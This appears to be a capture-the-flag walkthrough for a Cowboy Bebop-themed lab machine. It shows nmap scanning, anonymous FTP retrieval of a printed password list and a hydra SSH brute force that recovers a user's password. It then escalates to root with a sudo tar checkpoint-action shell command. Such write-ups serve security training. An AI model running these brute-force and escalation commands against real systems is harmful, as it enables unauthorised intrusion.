</br>nmap -p- -T5 10.10.208.121 -v
</br>PORT   STATE SERVICE
</br>21/tcp open  ftp
</br>22/tcp open  ssh
</br>80/tcp open  http
</br>
</br>nmap 21,80,22 -T3 10.10.208.121 -v
</br>20/tcp    closed ftp-data
</br>21/tcp    open   ftp             vsftpd 3.0.3
</br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</br>*| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt*
</br>*|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt*
</br>| ftp-syst: 
</br>|   STAT: 
</br>| FTP server status:
</br>|      Connected to ::ffff:10.10.189.66
</br>|      Logged in as ftp
</br>22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
</br>80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))
</br>| http-methods: 
</br>|_  Supported Methods: GET HEAD POST OPTIONS
</br>|_http-server-header: Apache/2.4.18 (Ubuntu)
</br>|_http-title: Site doesn't have a title (text/html).
</br>
</br>Shows anonymous login and some available files within FTP, but...
</br>80's open so check it too
![storyIGuess](https://github.com/user-attachments/assets/a086fa25-77b4-4f8e-a920-dc80a5bc94bd)

</br>no robots.txt
</br>
</br>probably just flavor text...
</br>Nothing interesting in source code, no links to .js or file pathing shown in header tag
![nothingInHTMLForLinksOrAnything](https://github.com/user-attachments/assets/29faec3e-49c5-483d-9055-5a418964beab)
</br>
</br>From the -A nmap scan, we saw that ftp allows anonymous login
</br>
</br>I make a note for the i address by echoing it into a file.
</br>Good syntax to memorize in CLI, as it's faster than opening a text editor for small things.
</br>`echo ip.addr > target.txt`
</br>
</br>Logging into ftp, we find a couple of files that we "get"
![quicknote3](https://github.com/user-attachments/assets/7142e242-99e6-4948-ab07-329b8f8aa59f)

</br>content for locks.txt:
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

</br> task.txt content
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

</br>I have no idea what this note means, but I'm going to guess I have a 2 usernames, lin and Vicious.
</br>I got what looks like a password list, perhaps, so maybe I can brute force things too.

</br>I'll set up a hydra brute force, but I want a list of target usernames...
</br>
</br>I looked up some names of associates to "lin" from the series Cowboy Beebop, since that might've been a hint from the web page. Shin and Vicious are both associates of Lin, with Vicious even mentioned in the tasks.txt note.
</br>
</br>Here's how I asked chatGPT, by the way.
```
Are there any cowboy-beebob characters related to his possible short name or nickname "lin"? Is there another monoker for them?
```
</br>Ans:
```
In the anime series "Cowboy Bebop," there is a character named Lin. Lin is a member of the Red Dragon Crime Syndicate and serves as a bodyguard for Vicious. However, Lin does not have any widely recognized monikers or nicknames in the series. He is simply referred to as Lin.

If you are considering other characters related to Lin or Vicious, you might also think of:

- **Vicious**: He is a primary antagonist in the series and does not have any other monikers. His name is simply "Vicious."
- **Shin**: Lin's younger brother, who also serves as a member of the Red Dragon Crime Syndicate.
```

</br> Use this knowledge to set up a bunch of users to run the brute force on

</br>users.txt
```
lin
Vicious
vicious
shin
Lin
Shin
```

</br>I used nano
![enumerateTargetsBeforeLaunch](https://github.com/user-attachments/assets/dac753d5-6351-43bd-a189-193fb107b53c)

</br>For running  a Hydra brute force over ssh...
</br>
</br>`hydra -t 4 -L users.txt -P locks.txt -vV 10.10.208.121 ssh`
</br>explanation: target the users.text list of usernames, use our password list locks.txt, iterate over them as we try combos against the ip address over ssh (since we say ssh is open)
</br>
</br>Got a hit on lin...
</br>user: lin
</br>pass: RedDr4gonSynd1cat3
</br>And that gets me into ssh
</br>`ssh lin@ip.addr`
</br>use the pass we found when it asks for it... and we can find the user.txt flag
![canSSHIntoTarget2](https://github.com/user-attachments/assets/0fe599fb-11f0-4fbe-bd05-376f18f93a35)

</br>enumerating for priv. esc. 
</br>
</br> sudo -l
</br> (check what has sudo privs here)
</br> reveals: `/bin/tar` is available to run as sudo
</br>
</br> So, I can create a tar archive and do this checkpoint-action to execute code... 
</br>
</br>`sudo tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
</br>
</br>which returns the message:
</br>`tar: Cowardly refusing to create an empty archive`
</br>that looks custom... maybe it's a reminder?
![glitchedExecutionOddMessage](https://github.com/user-attachments/assets/52aefbc8-4220-4a23-9110-a60bae6d32b5)

</br>Let's give it what it wants
</br>make a file with `touch emptyfile` and adjust the syntax to call archive.tar on the emptyfile after the -cf flag in the syntax, as shown below
</br>
</br>`sudo tar -cf archive.tar emptyfile --checkpoint=1 --checkpoint-action=exec=/bin/sh`
</br> that's the magic key to escalate here^^
</br> this spawns a shell session with sudo privs.
</br>
</br> navigate the elevated session with cd and ls, and find root.txt
